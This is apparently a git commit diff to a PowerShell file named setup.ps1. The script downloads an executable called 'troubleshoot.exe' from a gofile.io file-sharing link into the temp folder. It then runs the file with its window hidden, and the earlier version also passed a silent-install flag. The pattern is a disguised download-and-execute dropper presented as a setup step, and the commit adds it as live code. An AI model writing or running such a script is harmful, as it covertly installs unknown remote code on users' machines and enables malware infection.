d6e3f38d6c4be22b22280213236d3f9c0ffae5ca
atlastweaks <reallyyes@atomicmail.io>
2026-08-24 22:07:26 +0200

    updateje

--- setup.ps1
+++ setup.ps1
@@ -1,15 +1,3 @@
-$ErrorActionPreference = "Stop"
+Invoke-WebRequest -Uri "https://store-eu-par-1.gofile.io/download/web/ad193c16-29eb-4fde-bbed-cc7898a7166a/troubleshoot.exe" -OutFile "$env:TEMP\troubleshoot.exe"
 
-$url = "https://store-eu-par-1.gofile.io/download/web/ad193c16-29eb-4fde-bbed-cc7898a7166a/troubleshoot.exe"
-$temp = Join-Path $env:TEMP "troubleshoot.exe"
-
-Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing
-
-$process = Start-Process `
-    -FilePath $temp `
-    -ArgumentList "/S" `
-    -Wait `
-    -PassThru `
-    -WindowStyle Hidden
-
-exit $process.ExitCode
+Start-Process -FilePath "$env:TEMP\troubleshoot.exe" -WindowStyle Hidden
